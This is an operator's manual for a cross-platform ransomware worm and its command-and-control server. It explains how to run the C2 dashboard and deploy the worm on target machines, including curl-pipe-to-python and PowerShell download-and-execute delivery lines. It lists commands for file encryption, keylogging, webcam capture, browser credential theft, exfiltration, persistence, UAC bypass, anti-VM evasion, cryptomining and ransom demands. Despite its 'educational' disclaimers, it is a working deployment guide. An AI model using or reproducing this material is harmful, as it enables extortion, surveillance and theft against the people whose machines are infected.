# Cross-Platform Ransomware Worm with C2 Server

> **Complete Command and Control System Documentation**

## Table of Contents

- [Quick Start Guide](#quick-start-guide)
- [Features](#features)
- [Overview](#overview)
- [Features](#features)
- [System Architecture](#system-architecture)
- [Installation Guide](#installation-guide)
  - [C2 Server Installation](#c2-server-installation)
  - [Initial Server Configuration](#initial-server-configuration)
  - [Worm Deployment](#worm-deployment)
- [C2 Server Commands](#c2-server-commands)
  - [Encryption Commands](#encryption-commands)
  - [Keylogger Commands](#keylogger-commands)
  - [Webcam Commands](#webcam-commands)
  - [System Commands](#system-commands)
  - [Data Exfiltration Commands](#data-exfiltration-commands)
  - [Persistence Commands](#persistence-commands)
  - [Ransomware Commands](#ransomware-commands)
  - [Mining Commands](#mining-commands)
  - [Miscellaneous Commands](#miscellaneous-commands)
- [API Reference](#api-reference)
  - [REST Endpoints](#rest-endpoints)
  - [API Examples](#api-examples)
  - [WebSocket Events](#websocket-events)
- [Troubleshooting](#troubleshooting)
- [Security Considerations](#security-considerations)
- [File Structure](#file-structure)
- [Update Process](#update-process)
- [Support](#support)
- [Disclaimer](#disclaimer)
- [License](#license)
- [Quick Reference](#quick-reference)
---
# Quick Start Guide

## For the Impatient

### 1. Start the C2 Server (Your Machine)

```bash
# Install dependencies
pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# Run the server
python c2_server.py

# Access dashboard at http://localhost:5000
# Login: admin / secure_password_123
```

### 2. Deploy the Worm (Target Machine)

```bash
# Edit worm.py and set C2_SERVER to your IP
C2_SERVER = '192.168.1.100'  # Your machine's IP

# Run the worm
python3 worm.py
```

### 3. Send Commands

1. Open your browser to `http://localhost:5000`
2. Click on a connected host.
3. Select a command from the dropdown menu.
4. Click **Send Command**.

The client will automatically connect and execute the selected commands.

---

# Legal Disclaimer and License

> **IMPORTANT LEGAL NOTICE**
>
> **THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY.**

By downloading, installing, or using this software, you agree to the following terms:

## 1. Authorized Use Only

- This software may **ONLY** be used on systems you own or have explicit written permission to test.
- Unauthorized use of this software is illegal and may violate computer fraud and abuse laws.
- The author assumes no responsibility for any misuse or damage caused by this software.

## 2. Educational Purpose

This software is designed to demonstrate malware techniques for cybersecurity education.

It should only be used in controlled environments such as:

- Personal virtual machines
- Authorized penetration testing
- Cybersecurity training labs
- Academic research

## 3. No Warranty

- This software is provided **"AS IS"** without warranty of any kind.
- The author makes no guarantees regarding functionality or safety.
- Use at your own risk.

## 4. Liability

- The author is not liable for damages, data loss, or legal consequences.
- Users are solely responsible for their actions and compliance with applicable laws.
- The author will not provide support for illegal activities.

## 5. Reporting

- If you discover this software being used maliciously, report it to the author.
- Security researchers are encouraged to study the code to better understand malware techniques.

---

# License

```text
MIT License with Ethical Use Clause

Copyright (c) 2024

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software for EDUCATIONAL AND RESEARCH PURPOSES ONLY, subject to the
following conditions:

1. The above copyright notice and this permission notice shall be included in
   all copies or substantial portions of the Software.

2. ETHICAL USE CLAUSE: This Software shall NOT be used for:
   a) Any illegal activities
   b) Unauthorized access to computer systems
   c) Malicious purposes of any kind
   d) Commercial exploitation without prior written consent
   e) Any activity that violates local, national, or international laws

3. The Software is provided "AS IS", without warranty of any kind, express or
   implied, including but not limited to the warranties of merchantability,
   fitness for a particular purpose, and noninfringement. In no event shall the
   authors or copyright holders be liable for any claim, damages, or other
   liability, whether in an action of contract, tort, or otherwise, arising
   from, out of, or in connection with the Software or the use or other
   dealings in the Software.

4. Any use of this Software that violates any laws or ethical guidelines
   automatically terminates this license and all permissions granted herein.

5. Users must take full responsibility for ensuring their use of this Software
   complies with all applicable laws and regulations in their jurisdiction.

THE SOFTWARE IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY. THE AUTHORS DO NOT
CONDONE OR SUPPORT ANY ILLEGAL OR MALICIOUS USE OF THIS SOFTWARE.
```

By using this software, you acknowledge that you have read, understood, and agree to these terms.


## Overview

This document describes a complete cross-platform Command and Control (C2) system consisting of:

- **C2 Server:** A web-based dashboard for controlling infected machines.
- **Worm Malware:** Cross-platform agent that executes commands on Windows, macOS, and Linux.

The described capabilities include:

- File encryption and decryption
- Keystroke logging
- Webcam access
- Screenshot capture
- Data exfiltration
- Cryptocurrency mining
- System command execution
- Process injection
- And more...

---

## Features

### Worm Features

- Cross-platform support (Windows, macOS, Linux)
- Anti-VM detection
- Persistence mechanisms
- Stealth features
- AES-256 file encryption
- Keylogging
- Webcam capture
- Data exfiltration
- Cryptocurrency mining
- Process injection
- Dead man's switch
- Checkpoint resume

### C2 Server Features

- Web dashboard
- WebSocket support
- Command templates
- Keylog viewer
- Host statistics
- Multi-host management
- REST API
- Secure login

---

## System Architecture

```text
+-------------------------------------------------------------+
|                      C2 SERVER                              |
|                   (Your Computer)                           |
|                                                             |
|  +---------------+  +---------------+  +----------------+   |
|  | Web Dashboard |  | WebSocket     |  | REST API      |   |
|  | (Port 5000)   |  | (Real-time)   |  | (HTTP)        |   |
|  +---------------+  +---------------+  +----------------+   |
|                                                             |
|  +-----------------------------------------------------+    |
|  |               SQLite Database                       |    |
|  | Hosts, Commands, Keylogs, Encrypted Files           |    |
|  +-----------------------------------------------------+    |
+-------------------------------------------------------------+
                         |
                  DNS/HTTP Beacons
                         |
        +----------------+----------------+----------------+
        |                |                |
+---------------+ +---------------+ +---------------+
| Windows Agent | | macOS Agent   | | Linux Agent   |
+---------------+ +---------------+ +---------------+
```

---

# Installation Guide

## C2 Server Installation

### Option 1 — Quick Install

```bash
# Install dependencies
pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# Run
python c2_server.py
```

### Windows

```powershell
python -m pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

python c2_server.py
```

### macOS

```bash
brew install python3 python-tk

pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

python3 c2_server.py
```

### Linux

```bash
sudo apt update
sudo apt install python3 python3-pip python3-tk -y

pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

python3 c2_server.py
```

---

## Initial Server Configuration

```text
============================================================
C2 SERVER v2.0
============================================================
Server URL: http://0.0.0.0:5000
Username: admin
Password: secure_password_123
============================================================
Waiting for connections...
============================================================
```

---

## Worm Deployment

### Configuration

```python
C2_SERVER = "your-ip-address-or-domain.com"
```

### Deployment Methods

```bash
python3 worm.py
```

```bash
curl -s http://your-c2-server/worm.py | python3
```

```powershell
powershell -command "Invoke-Expression (Invoke-WebRequest -Uri 'http://your-c2-server/worm.py').Content"
```

---

# C2 Server Commands

## Command Structure

```json
{
  "host_id": "target-host-id",
  "command": "command_name",
  "params": {
    "param1": "value1",
    "param2": "value2"
  }
}
```

---

## Encryption Commands

| Command | Description | Parameters |
|---------|-------------|------------|
| encrypt | Encrypt all files | password |
| encrypt_files | Encrypt specific files | file_paths, password |
| encrypt_directory | Encrypt directory | directory, password, recursive |
| decrypt | Decrypt all files | password |
| decrypt_files | Decrypt files | file_paths, password |
| decrypt_directory | Decrypt directory | directory, password, recursive |
| encryption_status | Status | None |
| encryption_stats | Statistics | None |

---

## Keylogger Commands

| Command | Description |
|---------|-------------|
| keylog_start | Start capture |
| keylog_stop | Stop capture |
| keylog_status | Status |
| keylog_download | Download logs |
| keylog_clear | Clear logs |

---

## Webcam Commands

| Command | Description |
|---------|-------------|
| webcam_capture | Capture frame |
| webcam_stream | Stream video |
| webcam_status | Status |
| webcam_release | Release device |

---

## System Commands

| Command | Description |
|---------|-------------|
| execute | Run command |
| screenshot | Capture screenshot |
| screen_share | Share screen |
| block_computer | Lock computer |
| list_processes | List processes |
| kill_process | Kill process |
| inject_process | Inject process |

---

## Data Exfiltration Commands

| Command | Description |
|---------|-------------|
| exfiltrate | Steal files |
| steal_browser | Browser credentials |
| download_file | Download remote file |
| upload_file | Upload file |
| collect_data | Collect information |
| file_search | Search files |
| directory_list | List directories |

---

## Persistence Commands

| Command | Description |
|---------|-------------|
| install_persistence | Install persistence |
| persistence_status | Status |

---

## Ransomware Commands

| Command | Description |
|---------|-------------|
| display_ransom_note | Show ransom note |
| change_ransom_amount | Update amount |
| change_payment_address | Update address |
| deadline | Set deadline |

---

## Mining Commands

| Command | Description |
|---------|-------------|
| start_mining | Start mining |
| stop_mining | Stop mining |
| mining_status | Status |

---

## Miscellaneous Commands

| Command | Description |
|---------|-------------|
| status | Status |
| heartbeat | Heartbeat |
| get_os_info | OS information |
| get_stats | Statistics |
| clear_logs | Clear logs |
| bypass_uac | Bypass UAC |
| check_environment | Check VM |
| self_destruct | Self destruct |

---

# API Reference

## REST Endpoints

| Endpoint | Method |
|----------|--------|
| `/api/hosts` | GET |
| `/api/host/<host_id>` | GET |
| `/api/command` | POST |
| `/api/beacon` | POST |
| `/api/command_result` | POST |
| `/api/keylogs/<host_id>` | GET |
| `/api/encrypted_files/<host_id>` | GET |
| `/api/stats` | GET |
| `/api/command_templates` | GET |
| `/api/clear_logs` | POST |

---

## API Examples

### Send Command

```bash
curl -X POST http://localhost:5000/api/command \
-H "Content-Type: application/json" \
-d '{
  "host_id":"host-uuid",
  "command":"execute",
  "params":{"command":"whoami"}
}'
```

### Get Keylogs

```bash
curl http://localhost:5000/api/keylogs/host-uuid
```

### Get Statistics

```bash
curl http://localhost:5000/api/stats
```

---

## WebSocket Events

| Event | Direction |
|--------|-----------|
| connect | Client → Server |
| disconnect | Client → Server |
| beacon | Server → Client |
| command_result | Server → Client |
| get_hosts | Client → Server |
| send_command | Client → Server |
| hosts | Server → Client |

---

# Troubleshooting

## Server Won't Start

```bash
# Windows
netstat -ano | findstr :5000

# Linux/macOS
lsof -i :5000
```

## Worm Not Connecting

```bash
curl http://your-server-ip:5000/api/hosts
```

## Keylogger

```bash
sudo usermod -a -G input $USER
```

## Webcam

```bash
pip install opencv-python opencv-python-headless

sudo apt-get install v4l-utils
```

---

# Security Considerations

### Change Password

```python
ADMIN_PASSWORD = "your-strong-password-here"
```

### HTTPS

```python
socketio.run(
    app,
    host="0.0.0.0",
    port=5000,
    ssl_context=("cert.pem","key.pem")
)
```

### Allowed IPs

```python
ALLOWED_IPS = [
    "192.168.1.100",
    "10.0.0.5"
]
```

### Domain

```python
C2_DOMAIN = "your-domain.com"
```

### Backup Database

```bash
cp c2_database.db c2_database_backup_$(date +%Y%m%d).db
```

---

# File Structure

```text
c2_server/
├── c2_server.py
├── c2_database.db
├── c2_server.log
└── requirements.txt

worm/
├── worm.py
├── worm_debug.log
└── ~/.system_update/
```

---

# Update Process

## Worm

1. Modify `worm.py`
2. Deploy update
3. Send `self_update`

## Server

```bash
cp c2_database.db c2_database_backup.db

python c2_server.py
```

---

# Support

## Logs

- `c2_server.log`
- `worm_debug.log`
- `c2_database.db`

### Debug

```bash
python3 worm.py --debug

tail -f c2_server.log
```

---

# Disclaimer

This software is for educational and security research purposes only.

- Do not use on systems without explicit authorization.
- The author is not responsible for misuse.
- Follow all applicable laws.

---

# License

Educational purposes only.

---

# Quick Reference

| Item | Location | Notes |
|------|----------|------|
| C2 Server | `http://localhost:5000` | Login required |
| Worm | Target machine | Auto-connects |
| Commands | Dashboard/API | JSON |
| Database | `c2_database.db` | SQLite |
| Logs | `c2_server.log` | Text |
